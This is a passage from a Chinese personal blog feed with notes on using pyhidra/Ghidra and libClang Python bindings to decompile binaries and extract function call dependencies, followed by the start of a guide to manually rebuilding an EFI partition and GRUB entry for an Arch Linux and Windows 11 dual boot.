works</span></span><br><span class="line">            program = project.openProgram(<span class="string">&quot;/&quot;</span>, binary_path.name, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> IOException:</span><br><span class="line">        project = GhidraProject.createProject(project_location, project_name, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> binary_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> program <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> language <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            program = project.importProgram(binary_path)</span><br><span class="line">            <span class="keyword">if</span> program <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Ghidra failed to import &#x27;<span class="subst">&#123;binary_path&#125;</span>&#x27;. Try providing a language manually.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lang = _get_language(language)</span><br><span class="line">            comp = _get_compiler_spec(lang, compiler)</span><br><span class="line">            program = project.importProgram(binary_path, lang, comp)</span><br><span class="line">            <span class="keyword">if</span> program <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                message = <span class="string">f&quot;Ghidra failed to import &#x27;<span class="subst">&#123;binary_path&#125;</span>&#x27;. &quot;</span></span><br><span class="line">                <span class="keyword">if</span> compiler:</span><br><span class="line">                    message += <span class="string">f&quot;The provided language/compiler pair (<span class="subst">&#123;language&#125;</span> / <span class="subst">&#123;compiler&#125;</span>) may be invalid.&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    message += <span class="string">f&quot;The provided language (<span class="subst">&#123;language&#125;</span>) may be invalid.&quot;</span></span><br><span class="line">                <span class="keyword">raise</span> ValueError(message)</span><br><span class="line">        project.saveAs(program, <span class="string">&quot;/&quot;</span>, binary_path.name, <span class="literal">False</span>) <span class="comment"># True to False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> project, program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@contextlib.contextmanager</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_program</span>(<span class="params"></span></span><br><span class="line"><span class="params">        binary_path: Path,</span></span><br><span class="line"><span class="params">        project_location: <span class="type">Union</span>[<span class="built_in">str</span>, Path] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        project_name: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        analyze=<span class="literal">True</span>,</span></span><br><span class="line"><span class="params">        language: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        compiler: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; ContextManager[<span class="string">&quot;FlatProgramAPI&quot;</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Opens given binary path in Ghidra and returns FlatProgramAPI object.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param binary_path: Path to binary file, may be None.</span></span><br><span class="line"><span class="string">    :param project_location: Location of Ghidra project to open/create.</span></span><br><span class="line"><span class="string">        (Defaults to same directory as binary file)</span></span><br><span class="line"><span class="string">    :param project_name: Name of Ghidra project to open/create.</span></span><br><span class="line"><span class="string">        (Defaults to name of binary file suffixed with &quot;_ghidra&quot;)</span></span><br><span class="line"><span class="string">    :param analyze: Whether to run analysis before returning.</span></span><br><span class="line"><span class="string">    :param language: The LanguageID to use for the program.</span></span><br><span class="line"><span class="string">        (Defaults to Ghidra&#x27;s detected LanguageID)</span></span><br><span class="line"><span class="string">    :param compiler: The CompilerSpecID to use for the program. Requires a provided language.</span></span><br><span class="line"><span class="string">        (Defaults to the Language&#x27;s default compiler)</span></span><br><span class="line"><span class="string">    :return: A Ghidra FlatProgramAPI object.</span></span><br><span class="line"><span class="string">    :raises ValueError: If the provided language or compiler is invalid.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> _project, _program_pool</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> pyhidra.launcher <span class="keyword">import</span> PyhidraLauncher, HeadlessPyhidraLauncher</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> PyhidraLauncher.has_launched():</span><br><span class="line">        HeadlessPyhidraLauncher().start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> ghidra.app.script <span class="keyword">import</span> GhidraScriptUtil</span><br><span class="line">    <span class="keyword">from</span> ghidra.program.flatapi <span class="keyword">import</span> FlatProgramAPI</span><br><span class="line">    </span><br><span class="line">    program =  _program_pool.get(binary_path.name, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> program == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> _project == <span class="literal">None</span>:</span><br><span class="line">            project, program = _setup_project(</span><br><span class="line">                binary_path,</span><br><span class="line">                project_location,</span><br><span class="line">                project_name,</span><br><span class="line">                language,</span><br><span class="line">                compiler</span><br><span class="line">            )</span><br><span class="line">            _project = project</span><br><span class="line">            <span class="comment"># _project.setDeleteOnClose(True)</span></span><br><span class="line">            atexit.register(_project.close)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            program = _setup_project2(</span><br><span class="line">                binary_path,</span><br><span class="line">                language,</span><br><span class="line">                compiler</span><br><span class="line">            )</span><br><span class="line">        _program_pool[binary_path.name] = program</span><br><span class="line">    GhidraScriptUtil.acquireBundleHostReference()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flat_api = FlatProgramAPI(program)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> analyze:</span><br><span class="line">            _analyze_program(flat_api, program)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># change base address</span></span><br><span class="line">        base_addr = flat_api.toAddr(GHIDRA_BASE)</span><br><span class="line">        <span class="keyword">if</span> flat_api.currentProgram.getImageBase() != base_addr:</span><br><span class="line">            flat_api.currentProgram.setImageBase(base_addr, <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">assert</span> flat_api.currentProgram.getImageBase() == base_addr</span><br><span class="line"></span><br><span class="line">        <span class="keyword">yield</span> flat_api</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        FAIL(<span class="string">&quot;--- Error while opening program:&quot;</span>, e)</span><br><span class="line">        FAIL(<span class="string">f&quot;binary <span class="subst">&#123;binary_path&#125;</span> in <span class="subst">&#123;project_location&#125;</span>&quot;</span>)</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        GhidraScriptUtil.releaseBundleHostReference()</span><br><span class="line">        <span class="comment"># project.save(program)</span></span><br><span class="line">        <span class="comment"># project.close()</span></span><br></pre></td></tr></table></figure><h3 id="1-1-基础用法"><a href="#1-1-基础用法" class="headerlink" title="1.1 基础用法"></a>1.1 基础用法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyhidra</span><br><span class="line">pyhidra.start()</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> TYPE_CHECKING</span><br><span class="line"><span class="keyword">if</span> TYPE_CHECKING:</span><br><span class="line">    <span class="keyword">import</span> ghidra</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> ghidra.app.decompiler.flatapi <span class="keyword">import</span> FlatDecompilerAPI</span><br><span class="line"><span class="keyword">from</span> ghidra.program.flatapi <span class="keyword">import</span> FlatProgramAPI</span><br><span class="line"></span><br><span class="line">DATASET_PATH = Path(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">GHIDRA_DIR = Path(<span class="string">&quot;.&quot;</span>) <span class="comment"># Ghidra project location</span></span><br><span class="line">GHIDRA_PROJECT_NAME = <span class="string">&quot;test&quot;</span> <span class="comment"># Ghidra project name</span></span><br><span class="line">GHIDRA_BASE = <span class="number">0x400000</span> <span class="comment"># Ghidra base address, used in open_program</span></span><br><span class="line">FUNC_ADDRS: <span class="built_in">set</span>[<span class="built_in">str</span>] = <span class="built_in">set</span>() <span class="comment"># function addresses in binary (base addr is 0x0 in default)</span></span><br><span class="line"><span class="keyword">with</span> open_program(DATASET_PATH / <span class="string">&quot;test.so&quot;</span>, GHIDRA_DIR, GHIDRA_PROJECT_NAME) <span class="keyword">as</span> f_api:</span><br><span class="line">    f_api: FlatProgramAPI = f_api</span><br><span class="line">    decomp_api = FlatDecompilerAPI(f_api)</span><br><span class="line">    listing = f_api.currentProgram.getListing()</span><br><span class="line">    <span class="keyword">for</span> target <span class="keyword">in</span> FUNC_ADDRS:</span><br><span class="line">        func = f_api.getFunctionAt(f_api.toAddr(<span class="built_in">hex</span>(<span class="built_in">int</span>(target.addr, <span class="number">16</span>) + GHIDRA_BASE)))</span><br><span class="line">        acode = [] <span class="comment"># assembly code</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> listing.getCodeUnits(func.getBody(), <span class="literal">True</span>):</span><br><span class="line">            acode.append(i.toString())</span><br><span class="line">        panic_if_not(func <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>, <span class="string">f&quot;[-] function not found at <span class="subst">&#123;target.addr&#125;</span> in <span class="subst">&#123;bin_name&#125;</span>&quot;</span>)</span><br><span class="line">        dcode = decomp_api.decompile(func, <span class="number">0</span>).strip() <span class="comment"># decompiled code</span></span><br><span class="line">        acode = <span class="string">&quot;\n&quot;</span>.join(acode)</span><br><span class="line">        <span class="built_in">print</span>(dcode, acode, sep=<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="1-2-取-Callee-依赖方法"><a href="#1-2-取-Callee-依赖方法" class="headerlink" title="1.2 取 Callee 依赖方法"></a>1.2 取 Callee 依赖方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> binary_search.pyhidra_helper <span class="keyword">import</span> open_program</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> GHIDRA_DIR, GHIDRA_PROJECT_NAME, GHIDRA_BASE</span><br><span class="line"><span class="keyword">from</span> helper <span class="keyword">import</span> INFO, panic_if_not, WARNING, OK</span><br><span class="line"><span class="keyword">from</span> ghidra.program.flatapi <span class="keyword">import</span> FlatProgramAPI</span><br><span class="line"><span class="keyword">from</span> ghidra.util.task <span class="keyword">import</span> ConsoleTaskMonitor</span><br><span class="line"><span class="keyword">from</span> ghidra.program.model.listing <span class="keyword">import</span> Function</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_deps</span>(<span class="params">function_addrs: <span class="built_in">set</span>[<span class="built_in">str</span>], elf: Path</span>) -&gt; <span class="built_in">set</span>[<span class="built_in">tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]]:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Search for dependencies of given functions in given binary.</span></span><br><span class="line"><span class="string">    :param function_addrs: set of function addresses in Ghidra in hex string</span></span><br><span class="line"><span class="string">    :param elf: path to binary</span></span><br><span class="line"><span class="string">    :return: set of function addresses in Ghidra in hex string</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    known_addrs: <span class="built_in">str</span>[] = []</span><br><span class="line">    INFO(<span class="string">f&quot;[+] binary searching for deps for <span class="subst">&#123;<span class="built_in">len</span>(function_addrs)&#125;</span> functions in <span class="subst">&#123;elf&#125;</span>&quot;</span>)</span><br><span class="line">    panic_if_not(elf.exists(), <span class="string">f&quot;[-] <span class="subst">&#123;elf&#125;</span> not found&quot;</span>)</span><br><span class="line">    funcs: <span class="built_in">set</span>[<span class="built_in">tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]] = <span class="built_in">set</span>()</span><br><span class="line">    monitor = ConsoleTaskMonitor()</span><br><span class="line">    <span class="keyword">with</span> open_program(elf, GHIDRA_DIR, GHIDRA_PROJECT_NAME) <span class="keyword">as</span> f_api:</span><br><span class="line">        f_api: FlatProgramAPI = f_api <span class="comment"># for type hint</span></span><br><span class="line">        <span class="keyword">for</span> addr <span class="keyword">in</span> tqdm(function_addrs):</span><br><span class="line">            <span class="comment"># panic_if_not(int(addr, 16) &gt; GHIDRA_BASE, f&quot;[-] invalid address for Ghidra base &#123;addr&#125; &lt; &#123;hex(GHIDRA_BASE)&#125;&quot;)</span></span><br><span class="line">            func = f_api.getFunctionAt(f_api.toAddr(addr))</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                WARNING(<span class="string">f&quot;[-] function not found at <span class="subst">&#123;addr&#125;</span> in <span class="subst">&#123;elf&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># find CFG</span></span><br><span class="line">            called_funcs: <span class="built_in">set</span>[Function] = func.getCalledFunctions(monitor)</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> called_funcs:</span><br><span class="line">                addr: <span class="built_in">str</span> = f.getEntryPoint().toString() <span class="comment"># type: ignore</span></span><br><span class="line">                <span class="keyword">if</span> addr <span class="keyword">in</span> known_addrs:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                known_addrs.add(addr)</span><br><span class="line">                funcs.add((f.getName(), addr)) <span class="comment"># type: ignore</span></span><br><span class="line">        OK(<span class="string">f&quot;[+] found <span class="subst">&#123;<span class="built_in">len</span>(funcs)&#125;</span> functions as deps in <span class="subst">&#123;elf&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> funcs</span><br></pre></td></tr></table></figure><center> -EOF- </center>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 中用 libClang 进行源码静态分析</title>
      <link href="/2023/12/04/python-libClang-static-analysis/"/>
      <url>/2023/12/04/python-libClang-static-analysis/</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>libClang</code> 提供了一系列 python binding 来支持对单个(?) C&#x2F;C++ 文件进行静态分析</p></blockquote><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ol><li>不能正确处理宏, 比如 <code>#ifdef</code>, 如果他不满足就会不继续解析里面的内容, 这个在编译的条件下是合理的, 但是不能满足我的需求</li><li><code>libClang</code> 的 AST 语法树不知道为什么和 <code>clang -Xclang -ast-dump</code> 的结果不一样, 后者的结果是清晰的, 前者有的时候会把一些节点解析到 <code>UNEXPOSED_DECL</code> 而不是本身的</li></ol><h2 id="0-Prep"><a href="#0-Prep" class="headerlink" title="0. Prep"></a>0. Prep</h2><ol><li><code>libClang</code> 是捆绑在 <code>clang</code> 中的</li><li>安装 <code>clang</code> <code>pacman -S clang</code></li><li>找到 <code>libClang</code> 的 python binding <code>pacman -Ql clang | grep cindex.py</code> (比如位于 <code>clang /usr/lib/python3.11/site-packages/clang/cindex.py</code>)</li><li>[optional] 因为我是用的 <code>pipenv</code> 环境, 掉不到系统的库, 所以就直接把 <code>/usr/lib/python3.11/site-packages/clang</code> 文件夹复制到当前路径下</li><li>找到 <code>clang.so</code> 调用库的位置 <code>pacman -Ql clang | grep clang.so</code> (比如位于 <code>clang /usr/lib/libclang.so</code>)</li></ol><h2 id="1-Usage"><a href="#1-Usage" class="headerlink" title="1. Usage"></a>1. Usage</h2><h3 id="1-0-Basic-Usecase"><a href="#1-0-Basic-Usecase" class="headerlink" title="1.0 Basic Usecase"></a>1.0 Basic Usecase</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> clang.cindex <span class="keyword">as</span> cindex</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="comment"># folder of libclang.so, found in step 0.5</span></span><br><span class="line">cindex.Config.library_path = <span class="string">&quot;/usr/lib&quot;</span></span><br><span class="line"></span><br><span class="line">file = Path(<span class="string">&quot;test.c&quot;</span>)</span><br><span class="line">parser = cindex.Index.create()</span><br><span class="line">tu = parser.parse(file.absolute())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> tu.cursor.get_children():</span><br><span class="line">    node: cindex.Cursor = node <span class="comment"># for type hint</span></span><br><span class="line">                </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">str</span>(node.location.file).endswith(<span class="string">&quot;.c&quot;</span>):</span><br><span class="line">        <span class="comment"># if no need to dive into header files</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(node.kind, node.spelling, node.extent.start)</span><br></pre></td></tr></table></figure><h3 id="1-1-从-CALL-EXPR-取调用的方法名"><a href="#1-1-从-CALL-EXPR-取调用的方法名" class="headerlink" title="1.1 从 CALL_EXPR 取调用的方法名"></a>1.1 从 CALL_EXPR 取调用的方法名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_function_name_in_CALL_EXPR</span>(<span class="params">node: cindex.Cursor</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">assert</span> node.kind == cindex.CursorKind.CALL_EXPR</span><br><span class="line">    tmp = <span class="built_in">next</span>(node.get_children())</span><br><span class="line">    <span class="keyword">if</span> tmp.kind == cindex.CursorKind.DECL_REF_EXPR:</span><br><span class="line">        DEBUG(<span class="string">f&quot;Fall back to DECL_REF_EXPR <span class="subst">&#123;tmp.spelling&#125;</span> <span class="subst">&#123;tmp.kind&#125;</span> <span class="subst">&#123;tmp.extent.start&#125;</span>&quot;</span>)</span><br><span class="line">        name = tmp.spelling</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        childs = [c <span class="keyword">for</span> c <span class="keyword">in</span> tmp.get_children()]</span><br><span class="line">        <span class="comment"># panic_if_not(len(childs) == 1, childs)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(childs) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> childs[<span class="number">0</span>].kind != cindex.CursorKind.DECL_REF_EXPR:</span><br><span class="line">            DEBUG(<span class="string">f&quot;(Skip indirect calling)UB in parse <span class="subst">&#123;childs[<span class="number">0</span>].spelling&#125;</span> <span class="subst">&#123;childs[<span class="number">0</span>].kind&#125;</span> <span class="subst">&#123;childs[<span class="number">0</span>].extent.start&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        name = childs[<span class="number">0</span>].spelling</span><br><span class="line">    <span class="keyword">return</span> name</span><br></pre></td></tr></table></figure><h3 id="1-2-取方法中调用的方法名"><a href="#1-2-取方法中调用的方法名" class="headerlink" title="1.2 取方法中调用的方法名"></a>1.2 取方法中调用的方法名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_function</span>(<span class="params">node: cindex.Cursor</span>) -&gt; <span class="built_in">set</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">assert</span> node.kind == cindex.CursorKind.FUNCTION_DECL</span><br><span class="line">    dep_funcs = <span class="built_in">set</span>()</span><br><span class="line">    func_body = [n <span class="keyword">for</span> n <span class="keyword">in</span> node.get_children() <span class="keyword">if</span> n.kind == cindex.CursorKind.COMPOUND_STMT]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(func_body) == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># Can be forward-decline</span></span><br><span class="line">        DEBUG(<span class="string">f&quot;not found body, can be forward-decline <span class="subst">&#123;node.spelling&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> dep_funcs</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(func_body) == <span class="number">1</span></span><br><span class="line">    func_body: cindex.Cursor = func_body[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> child <span class="keyword">in</span> func_body.walk_preorder():</span><br><span class="line">        child: cindex.Cursor = child <span class="comment"># for type hint</span></span><br><span class="line">        <span class="keyword">if</span> child.kind == cindex.CursorKind.CALL_EXPR:</span><br><span class="line">            name = find_function_name_in_CALL_EXPR(child)</span><br><span class="line">            dep_funcs.add(name)</span><br><span class="line">    <span class="keyword">return</span> dep_funcs</span><br></pre></td></tr></table></figure><center> -EOF- </center>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Note </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arch Win11 Dualboot 手动重建 EFI 分区</title>
      <link href="/2023/11/23/Arch-dualboot-efi/"/>
      <url>/2023/11/23/Arch-dualboot-efi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前情提要: 硬盘上已经有 Windows 11 和 ArchLinux 两个系统, 因为 Windows 自带的 EFI 只有 100MB 塞不下，所以我直接把他给格式化了, 现在需要重新建立引导.<br>但是我的 <code>os-prober</code> 无法识别 Windows 11 然后他每次跑卡住了, 所以我准备手写 grub<br>我的磁盘分区表都是 <code>GPT</code><br>下面命令我都不会写 <code>sudo</code>, 需要自己加上就好了  </p></blockquote><p>TODO:  </p><ul><li><input disabled="" type="checkbox"> Arch 用 chainlaoder 引导</li></ul><h2 id="0-准备"><a href="#0-准备" class="headerlink" title="0. 准备"></a>0. 准备</h2><ul><li>Arch 安装盘</li><li>一个 Windows PE 盘, 我是刷的 <a href="https://www.hirensbootcd.org/">Hiren’s BootCD PE</a>, 可以想办法进 Arch 里面(通过 <code>arch-chroot</code>) 然后用下面的方法刷</li><li>硬盘还有 300MB 左右的空间分一个独立的 EFI 分区, 位置无所谓, 我上放在 ArchLinux 的分区前</li></ul><h3 id="0-0-刷-Hiren’s-BootCD-PE"><a href="#0-0-刷-Hiren’s-BootCD-PE" class="headerlink" title="0.0 刷 Hiren’s BootCD PE"></a>0.0 刷 Hiren’s BootCD PE</h3><ol start="0"><li>在 ArchLinux 中</li><li>下载 <a href="https://www.hirensbootcd.org/">Hiren’s BootCD PE</a> 的 ISO</li><li>格式化一个 U 盘:<ol><li>先用 <code>lsblk</code> 看 USB 的标识, 假设是 <code>/dev/sdb</code></li><li>用 <code>cfdisk /dev/sdb</code> 把里面的都删除了, 然后写入新分区</li><li>用 <code>mkfs.fat -F 32 /dev/sdb</code> 格式化成 FAT32</li><li>用 <code>sudo dd bs=4M if=HBCD_PE_x64.iso of=/dev/sdb conv=fsync oflag=direct status=progress</code> 烧录 ISO</li></ol></li></ol><h3 id="0-1-格式化-EFI-分区"><a href="#0-1-格式化-EFI-分区" class="headerlink" title="0.1 格式化 EFI 分区"></a>0.1 格式化 EFI 分区</h3><ol start="0"><li>在 ArchLinux 中</li><li>用 <code>lsblk</code> 看 EFI 分区的标识, 假设是 <code>/dev/nvme0n1</code> 下</li><li>用 <code>cfdisk /dev/nvme0n1</code> 在里面分一个 300MB 左右的 EFI 分区</li><li>用 <code>mkfs.fat -F 32 /dev/nvme0n1p7</code> 格式化 EFI 分区成 FAT32 (或者不用 <code>-F 32</code> 格式化成 FAT16 也行)</li></ol><h2 id="1-重建-Arch-引导"><a href="#1-重建-Arch-引导" class="headerlink" title="1. 重建 Arch 引导"></a>1. 重建 Arch 引导</h2><ol start="0"><li>在 ArchLinux 中</li><li>用 <code>mount /dev/nvme0n1p7 /boot</code> 挂载 EFI 分区, 如果还没挂载</li><li><code>grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=GRUB</code> 来装 <code>grub</code> 文件, 参考 <a href="https://wiki.archlinux.org/title/GRUB#Installation_2">ArchWiki</a><ul><li>会在 <code>/boot/grub</code> 下创建 <code>grub</code> 文件夹</li></ul></li><li><code>pacman -S linux intel-ucode</code> 把内核和 ucode 的 img 都写入到 EFI 分区 (如果不是 intel 的就装对应 ucode, 然后你要是用 <code>linux-lts</code> 也可以装 <code>linux-lts</code>)<ul><li>会在 <code>/boot</code> 下创建 <code>intel-ucode.img</code>, <code>vmlinuz-linux</code>, <code>initramfs-linux.img</code> 和 <code>initramfs-linux-fallback.img</code></li></ul></li><li>记得把 <code>/etc/default/grub</code> 里的 <code>GRUB_DISABLE_OS_PROBER=&quot;false&quot;</code> 给注释掉, 因为我们不打算用 <code>os-prober</code></li><li>进入 <code>/etc/grub.d/</code> 下, 用 <code>cp 40_custom 10_linux</code> 复制一份 (前面的数字 10 是优先级, 10 会在 grub menu 中显示在 40 的前面, 后面的 linux 是名字可以随便取)</li><li><code>cat /etc/fstab</code> 看一下 EFI 分区和 ArchLinux 分区的 UUID, 假设是 <code>1111-A1B2</code> 和 <code>11111111-1111-1111-1111-111111111111</code></li><li>编辑 <code>/etc/grub.d/10_linux</code>, 改成   <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">tail</span> -n +3 <span class="variable">$0</span></span><br><span class="line"><span class="comment"># This file provides an easy way to add custom menu entries.  Simply type the</span></span><br><span class="line"><span class="comment"># menu entries you want to add after this comment.  Be careful not to change</span></span><br><span class="line"><span class="comment"># the &#x27;exec tail&#x27; line above.</span></span><br><span class="line">menuentry <span class="string">&quot;Arch&quot;</span> &#123;</span><br><span class="line">        insmod part_gpt</span><br><span class="line">        insmod fat</span><br><span class="line">        insmod ext2</span><br><span class="line">        insmod gzio</span><br><span class="line">        <span class="built_in">set</span> root=<span class="string">&#x27;&lt;EFI DISK PARTISION ID&gt;&#x27;</span></span><br><span class="line">        search --no-floppy --fs-uuid --<span class="built_in">set</span>=root &lt;EFI UUID&gt;</span><br><span class="line">        linux /vmlinuz-linux root=UUID=&lt;ARCH UUID&gt; rw loglevel=3</span><br><span class="line">        initrd /intel-ucode.img /initramfs-linux.img</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>其中 <code>&lt;EFI DISK PARTISION ID&gt;</code> 是 EFI 分区的硬盘表达 (一般来说不准没什么用, 因为如果你插入了其他 USB, 他硬盘顺序就乱了) 比如在 <code>lsblk</code> 下 <code>/dev/nvme0n1</code> 是第一个磁盘, 